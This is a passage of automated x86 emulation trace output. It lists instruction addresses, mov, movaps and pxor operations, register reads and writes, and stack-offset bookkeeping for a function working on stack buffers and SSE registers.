for stack size 0x10000 0x427e64: movaps xmm2, xmmword ptr [ebp - 0x1f0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e10 for stack size 0x10000 0x427e6f: movaps xmm3, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x427e8d: mov dword ptr [ebp - 0x64], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x427e90: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427ea6: mov dword ptr [edi], ecx, regs_read: [23, 22], regs_write: () 0x427ea8: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427eab: mov edi, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x427eb8: mov dword ptr [ecx + 0x30], edi, regs_read: [22, 23], regs_write: () 0x427ebb: mov dword ptr [ecx + 0x20], esi, regs_read: [22, 29], regs_write: () 0x427ebe: mov dword ptr [ecx + 0x10], edx, regs_read: [22, 24], regs_write: () 0x427ec1: mov ecx, dword ptr [eax + 0x14], regs_read: [19], regs_write: [22] 0x427ed8: mov dword ptr [ebp - 0x64], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x427edb: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427ef1: mov dword ptr [edi + 0x14], ecx, regs_read: [23, 22], regs_write: () 0x427ef4: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427ef7: mov edi, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x427f04: mov dword ptr [ecx + 4], edi, regs_read: [22, 23], regs_write: () 0x427f07: mov dword ptr [ecx + 0x34], esi, regs_read: [22, 29], regs_write: () 0x427f0a: mov dword ptr [ecx + 0x24], edx, regs_read: [22, 24], regs_write: () 0x427f1d: mov dword ptr [ebp - 0x50], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x427f23: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427f39: mov dword ptr [edi + 0x28], ecx, regs_read: [23, 22], regs_write: () 0x427f3c: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427f3f: mov edi, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x427f42: mov dword ptr [ecx + 0x18], edi, regs_read: [22, 23], regs_write: () 0x427f45: mov dword ptr [ecx + 8], esi, regs_read: [22, 29], regs_write: () 0x427f4c: mov dword ptr [ecx + 0x38], edx, regs_read: [22, 24], regs_write: () 0x427f6f: mov dword ptr [ebp - 0x50], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x427f72: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427f7c: mov dword ptr [edi + 0x3c], ecx, regs_read: [23, 22], regs_write: () 0x427f7f: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427f82: mov edi, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x427f85: mov dword ptr [ecx + 0x2c], edi, regs_read: [22, 23], regs_write: () 0x427f88: mov edi, ecx, regs_read: [22], regs_write: [23] 0x427f8a: mov ecx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x427f8d: mov dword ptr [edi + 0x1c], esi, regs_read: [23, 29], regs_write: () 0x427f90: mov esi, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x427f93: mov dword ptr [edi + 0xc], edx, regs_read: [23, 24], regs_write: () 0x427f96: mov edx, dword ptr [ecx + 0x34], regs_read: [22], regs_write: [24] 0x427f9c: mov esi, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x427fa5: mov edx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x427fb1: mov dword ptr [ebp - 0x4c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x427fb4: mov edi, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x427fb7: mov dword ptr [edx + 0x34], ecx, regs_read: [24, 22], regs_write: () 0x427fba: mov ecx, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x427fc0: mov dword ptr [ebp - 0x70], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x427fc3: mov dword ptr [ebp - 0x74], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x427fe5: mov ecx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 0x427fe8: mov esi, 5, regs_read: (), regs_write: [29] 0x427fed: mov edi, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x427ff6: mov ecx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x427ffc: movaps xmmword ptr [ebp - 0xb0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x428006: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42800d: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42801a: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42801e: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428022: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42802e: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42803b: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42803f: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428047: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42804a: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x428057: pxor xmm2, xmmword ptr [ebp - 0xb0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x42805f: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428063: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x42806a: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x428077: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42807b: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428088: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x428095: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428099: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42809d: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x4280a9: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x4280b0: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x4280c2: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4280c6: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4280ce: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x4280db: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4280df: movaps xmm7, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x4280e6: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4280ea: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x4280ed: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4280f9: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x428106: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42810a: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428112: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42811f: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428123: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428127: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x428133: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x42813a: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x42814c: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428150: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428158: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x428160: movaps xmm1, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x428167: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428170: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x428173: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42817b: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x428188: pxor xmm6, xmm4, regs_read: [128, 126], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42818c: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x428199: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x4281a6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4281af: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4281b8: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x4281bb: movaps xmmword ptr [ebp - 0xb0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4281c6: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x4281d3: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4281d7: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4281e4: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4281f1: pxor xmm0, xmmword ptr [ebp - 0xd0], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x42cac6: mov dword ptr [ebp - 0x118], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42cacc: mov edx, esi, regs_read: [29], regs_write: [24] 0x42cace: mov esi, edi, regs_read: [23], regs_write: [29] 0x42cae4: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42caea: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42caf0: mov esi, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42caf6: mov ebx, esi, regs_read: [29], regs_write: [21] 0x42cafb: mov dword ptr [ebp - 0xdc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 saving data to stack: 0 4 0x42cb01: mov ebx, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42cb0e: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42cb18: mov esi, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42cb24: mov esi, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42cb2a: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42cb36: mov eax, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42cb3e: mov dword ptr [ebp - 0x90], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42cb44: mov eax, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42cb4d: mov ecx, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42cb5a: mov dword ptr [ebp - 0x90], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42cb60: mov ecx, esi, regs_read: [29], regs_write: [22] 0x42cb62: mov dword ptr [ebp - 0x98], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42cb78: mov edi, eax, regs_read: [19], regs_write: [23] 0x42cb7c: mov dword ptr [ebp - 0x108], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42cb82: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42cb84: mov dword ptr [ebp - 0xb8], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42cb92: mov ecx, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42cb9a: mov dword ptr [ebp - 0xb0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42cba0: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42cbad: mov dword ptr [ebp - 0x114], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42cbb7: mov ebx, dword ptr [ebp - 0xec], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 0x42cbbd: mov ecx, dword ptr [ebp - 0x11c], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 0x42cbc6: mov esi, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42cbcc: mov edi, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42cbd2: mov dword ptr [ebp - 0x10c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42cbd8: mov edx, ebx, regs_read: [21], regs_write: [24] 0x42cbe3: mov dword ptr [ebp - 0xa8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42cbf1: mov ecx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 0x42cbf9: mov dword ptr [ebp - 0xac], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42cc03: mov eax, dword ptr [ebp - 0x11c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 0x42cc0b: mov dword ptr [ebp - 0xc8], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42cc17: mov dword ptr [ebp - 0xbc], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42cc1d: mov edi, eax, regs_read: [19], regs_write: [23] 0x42cc2d: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42cc38: mov ebx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42cc43: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42cc4d: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42cc4f: mov dword ptr [ebp - 0xac], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42cc57: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42cc67: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42cc6f: mov ecx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42cc77: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42cc7f: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x42cc87: mov dword ptr [ebp - 0xbc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42cc8f: mov dword ptr [ebp - 0x134], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x42cc95: mov ebx, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42cc9b: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42ccac: mov dword ptr [ebp - 0x140], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x42ccb2: mov ecx, dword ptr [ebp - 0x110], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 0x42ccb8: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42ccbd: mov dword ptr [ebp - 0x128], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 0 4 0x42ccc3: mov eax, dword ptr [ebp - 0x120], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 0x42ccc9: mov edi, eax, regs_read: [19], regs_write: [23] 0x42ccd4: mov dword ptr [ebp - 0xc0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42cce2: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42cce8: mov esi, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 0x42ccf4: mov ebx, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42ccfc: mov dword ptr [ebp - 0xb4], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42cd02: mov esi, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42cd0a: mov dword ptr [ebp - 0xb8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42cd12: mov dword ptr [ebp - 0xb0], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42cd1c: mov edi, ecx, regs_read: [22], regs_write: [23] 0x42cd2a: mov ecx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42cd32: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42cd40: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42cd4e: mov dword ptr [ebp - 0x94], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42cd58: mov edx, eax, regs_read: [19], regs_write: [24] 0x42cd66: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42cd6e: mov ecx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42cd76: mov dword ptr [ebp - 0x108], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42cd7e: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42cd86: mov dword ptr [ebp - 0xb0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42cd8e: mov dword ptr [ebp - 0xec], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42cd94: mov edi, dword ptr [ebp - 0xcc], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 0x42cd9a: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42cdab: mov dword ptr [ebp - 0x110], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42cdb1: mov ecx, dword ptr [ebp - 0x114], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 0x42cdb7: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42cdbc: mov dword ptr [ebp - 0x120], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42cdc2: mov eax, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 0x42cdc8: mov esi, eax, regs_read: [19], regs_write: [29] 0x42cdd3: mov dword ptr [ebp - 0x9c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42cddf: mov dword ptr [ebp - 0xd0], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42cde5: mov esi, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42cdf5: mov dword ptr [ebp - 0xcc], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 saving data to stack: 0 4 0x42cdfd: mov esi, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42ce05: mov edi, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42ce0b: mov dword ptr [ebp - 0xe4], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42ce15: mov dword ptr [ebp - 0xf4], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42ce1d: mov edi, ecx, regs_read: [22], regs_write: [23] 0x42ce2f: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42ce35: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42ce43: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42ce51: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42ce59: mov edx, eax, regs_read: [19], regs_write: [24] 0x42ce62: mov dword ptr [ebp - 0x118], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42ce6f: mov eax, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42ce77: mov dword ptr [ebp - 0x114], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42ce7d: mov ecx, dword ptr [ebp - 0xe4], regs_read: [20], 